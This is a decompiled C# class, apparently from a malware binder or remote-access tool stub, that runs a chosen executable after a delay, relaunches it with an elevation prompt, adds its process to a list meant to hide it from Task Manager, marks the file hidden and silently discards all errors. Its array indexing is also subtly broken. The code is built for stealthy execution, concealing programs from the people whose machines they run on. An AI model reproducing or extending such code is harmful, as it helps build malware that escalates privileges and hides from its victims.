namespace Chat
{
    using Chat.My;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Threading;

    public class FileProtector
    {
        private ProtectionSettings SettingsClass;

        public FileProtector(ProtectionSettings Settings)
        {
            this.SettingsClass = Settings;
        }

        private void DoAll(string Patch)
        {
            try
            {
                if (this.SettingsClass.ExecutionDelay)
                {
                    Thread.Sleep((int) (this.SettingsClass.ExecutionDelayTime * 0x3e8));
                }
                Process process = Process.Start(Patch);
                if (this.SettingsClass.ElevateAdmin)
                {
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.UseShellExecute = true;
                    startInfo.WorkingDirectory = Environment.CurrentDirectory;
                    startInfo.FileName = Patch;
                    startInfo.Verb = "runas";
                    try
                    {
                        Process process2 = Process.Start(startInfo);
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        ProjectData.ClearProjectError();
                    }
                    foreach (Process process3 in Process.GetProcesses())
                    {
                        if ((process3.ProcessName == process.ProcessName) & (process3.MainWindowTitle == process.MainWindowTitle))
                        {
                            process.Kill();
                            process = process3;
                            break;
                        }
                    }
                }
                if (this.SettingsClass.HideProcess)
                {
                    if (!Hide_Process_From_TaskManager.Running)
                    {
                        Hide_Process_From_TaskManager.Running = true;
                    }
                    Array.Resize<string>(ref Hide_Process_From_TaskManager.Processes_Names, Hide_Process_From_TaskManager.Processes_Names.Length + 1);
                    Hide_Process_From_TaskManager.Processes_Names[Hide_Process_From_TaskManager.Processes_Names.Length + 1] = process.ProcessName;
                }
                if (this.SettingsClass.HideFile)
                {
                    FileInfo fileInfo = MyProject.Computer.FileSystem.GetFileInfo(Patch);
                    fileInfo.Attributes |= FileAttributes.Hidden;
                }
            }
            catch (Exception exception2)
            {
                ProjectData.SetProjectError(exception2);
                ProjectData.ClearProjectError();
            }
        }

        public void Start(string Patch, [Optional, DefaultParameterValue(false)] bool ReadFromFile)
        {
            if (Patch.Contains(".exe") & MyProject.Computer.FileSystem.FileExists(Patch))
            {
                if (ReadFromFile & this.SettingsClass.StartUP)
                {
                    this.DoAll(Patch);
                }
                else if (!ReadFromFile)
                {
                    this.DoAll(Patch);
                }
            }
        }
    }
}

